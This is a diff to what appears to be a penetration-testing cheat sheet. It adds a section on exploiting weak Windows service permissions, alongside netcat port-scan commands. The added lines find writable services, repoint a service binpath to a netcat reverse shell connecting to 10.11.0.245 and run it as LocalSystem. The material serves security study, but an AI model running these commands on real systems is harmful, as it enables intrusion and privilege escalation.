@@ -308,10 +308,15 @@ nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
-#### Finding Vulnerable Windows Services
+#### Exploiting Vulnerable Windows Services: Weak Service Permissions
 ```
 # Look for SERVICE_ALL_ACCESS in the output
-accesschk.exe -uwcqv "user-you-have-shell-with" *
+accesschk.exe -uwcqv "Authenticated Users" *
+
+sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe"
+sc config [service_name] obj= "LocalSystem" password= ""
+sc qc [service_name] (to verify!)
+sc start [service_name]
 ```
 
 
